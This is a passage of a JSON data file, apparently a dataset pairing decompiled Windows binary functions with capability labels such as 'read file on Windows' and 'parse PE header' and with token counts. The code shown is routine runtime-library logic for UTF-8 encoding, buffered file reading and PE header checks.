        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0001800d57e2: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0001800d57e7)\n\nint64_t fcn.1800d574c(uint8_t *arg1, ulong noname_1, ulong *arg3)\n\n{\n    ulong *puVar1;\n    uint *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    ulong *puVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint8_t uVar8;\n    ulong auStackX24 [2];\n    ulong uStack48;\n    \n    puVar5 = 0x180129fc8;\n    if (arg3 != NULL) {\n        puVar5 = arg3;\n    }\n    if (*puVar5 == 0) {\n        if (noname_1 + 0x2400 < 0x400) {\ncode_r0x0001800d577b:\n            *puVar5 = 0;\n            uStack48 = 0x1800d5784;\n            puVar2 = fcn.1800ba53c(arg1);\n            *puVar2 = 0x2a;\n            return -1;\n        }\n        uVar4 = noname_1;\n        if (noname_1 + 0x2800 < 0x400) {\n            *puVar5 = (uVar4 & 0x3f27ff) * 0x400 + 0x10000;\n            return 0;\n        }\n    }\n    else {\n        if (0x3ff < noname_1 + 0x2400) goto code_r0x0001800d577b;\n        auStackX24[0] = 0;\n        puVar1 = &stack0x00000018;\n        uVar4 = (noname_1 & 0xffff23ff) + *puVar5;\n        *0x20 = &stack0xffffffffffffffd0;\n        uStack48 = 0x1800d57e7;\n        puVar5 = puVar1;\n    }\n    if (arg1 != NULL) {\n        if (uVar4 != 0) {\n            if ((uVar4 & 0xffffff80) == 0) {\n                *arg1 = uVar4;\n                return 1;\n            }\n            if ((uVar4 & 0xfffff800) == 0) {\n                iVar6 = 1;\n                uVar8 = 0xc0;\n                iVar7 = iVar6;\n            }\n            else if ((uVar4 & 0xffff0000) == 0) {\n                if (uVar4 - 0xd800 < 0x800) {\ncode_r0x0001800cec47:\n                    *puVar5 = 0;\n                    *(*0x20 + -0x30) = 0x1800cec50;\n                    puVar2 = fcn.1800ba53c(arg1);\n                    *puVar2 = 0x2a;\n                    return -1;\n                }\n                iVar6 = 2;\n                uVar8 = 0xe0;\n                iVar7 = iVar6;\n            }\n            else {\n                if (((uVar4 & 0xffe00000) != 0) || (0x10ffff < uVar4)) goto code_r0x0001800cec47;\n                iVar6 = 3;\n                uVar8 = 0xf0;\n                iVar7 = iVar6;\n            }\n            do {\n                uVar3 = uVar4;\n                uVar4 = uVar4 >> 6;\n                arg1[iVar6] = uVar3 & 0x3f | 0x80;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n            *arg1 = uVar4 | uVar8;\n            *puVar5 = 0;\n            return iVar7 + 1;\n        }\n        *arg1 = uVar4;\n    }\n    *puVar5 = 0;\n    return 1;\n}\n",
        "token_count": 899
    },
    "1800b1da": {
        "rules": [
            "read file on Windows"
        ],
        "decompiled_code": "\nuint64_t fcn.1800b1dac(uint8_t **arg1)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t uVar2;\n    uint8_t *arg2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int64_t iVar6;\n    \n    if (arg1 == NULL) {\n        puVar5 = fcn.1800ba53c(0);\n        *puVar5 = 0x16;\n        fcn.1800b3508();\n        return 0xffffffff;\n    }\n    ppuVar1 = arg1 + 2;\n    *ppuVar1 = *ppuVar1 + -1;\n    if (*ppuVar1 < 0) {\n        if (arg1 == NULL) {\n            puVar5 = fcn.1800ba53c(0);\n            *puVar5 = 0x16;\n            fcn.1800b3508();\n        }\n        else if (((*(arg1 + 0x14) >> 0xd & 1) != 0) && ((*(arg1 + 0x14) >> 0xc & 1) == 0)) {\n            if ((*(arg1 + 0x14) >> 1 & 1) == 0) {\n                LOCK();\n                *(arg1 + 0x14) = *(arg1 + 0x14) | 1;\n                if ((*(arg1 + 0x14) & 0x4c0) == 0) {\n                    fcn.1800c3a3c(arg1);\n                }\n                arg2 = arg1[1];\n                *arg1 = arg2;\n                uVar3 = fcn.1800c20cc(arg1);\n                iVar4 = fcn.1800c87fc(uVar3, arg2, *(arg1 + 4));\n                *(arg1 + 2) = iVar4;\n                if (1 < iVar4 + 1U) {\n                    if ((*(arg1 + 0x14) & 6) == 0) {\n                        iVar4 = fcn.1800c20cc(arg1);\n                        if ((iVar4 == -1) || (iVar4 = fcn.1800c20cc(arg1),  iVar4 == -2)) {\n                            iVar6 = 0x1801233c0;\n                        }\n                        else {\n                            iVar4 = fcn.1800c20cc(arg1);\n                            uVar3 = fcn.1800c20cc(arg1);\n                            iVar6 = *((iVar4 >> 6) * 8 + 0x180129850) + (uVar3 & 0x3f) * 0x48;\n                        }\n                        if ((*(iVar6 + 0x38) & 0x82) == 0x82) {\n                            LOCK();\n                            *(arg1 + 0x14) = *(arg1 + 0x14) | 0x20;\n                        }\n                    }\n                    if (((*(arg1 + 4) == 0x200) && ((*(arg1 + 0x14) >> 6 & 1) != 0)) && ((*(arg1 + 0x14) >> 8 & 1) == 0)\n                       ) {\n                        *(arg1 + 4) = 0x1000;\n                    }\n                    *(arg1 + 2) = *(arg1 + 2) + -1;\n                    uVar2 = **arg1;\n                    *arg1 = *arg1 + 1;\n                    return uVar2;\n                }\n                LOCK();\n                *(arg1 + 0x14) = *(arg1 + 0x14) | (-(iVar4 != 0) & 8) + 8;\n                *(arg1 + 2) = 0;\n            }\n            else {\n                LOCK();\n                *(arg1 + 0x14) = *(arg1 + 0x14) | 0x10;\n            }\n        }\n        return 0xffffffff;\n    }\n    uVar2 = **arg1;\n    *arg1 = *arg1 + 1;\n    return uVar2;\n}\n",
        "token_count": 916
    },
    "1800c0ce": {
        "rules": [
            "parse PE header"
        ],
        "decompiled_code": "\nvoid fcn.1800c0cec(ulong arg1)\n\n{\n    code *pcVar1;\n    int16_t *piVar2;\n    int32_t *piVar3;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    uchar auStackX32 [8];\n    uchar auStack56 [4];\n    uint uStack52;\n    uint auStack48 [2];\n    uint *puStack40;\n    int32_t *piStack32;\n    uchar *puStack24;\n    \n    aiStackX24[0] = 0;\n    auStackX16[0] = 2;\n    piVar2 = (**0x1800de450)(0);\n    if ((((piVar2 != NULL) && (*piVar2 == 0x5a4d)) && (piVar3 = *(piVar2 + 0x1e) + piVar2,  *piVar3 == 0x4550)) &&\n       (((*(piVar3 + 6) == 0x20b && (0xe < piVar3[0x21])) && (piVar3[0x3e] != 0)))) {\n        fcn.1800c0c78(arg1);\n    }\n    puStack40 = auStackX16;\n    auStackX32[0] = 0;\n    piStack32 = aiStackX24;\n    puStack24 = auStackX32;\n    uStack52 = 2;\n    auStack48[0] = 2;\n    fcn.1800c0a68(auStack56, auStack48, &puStack40, &uStack52);\n    if (aiStackX24[0] == 0) {\n        fcn.1800c0c2c(arg1);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 417
    }
}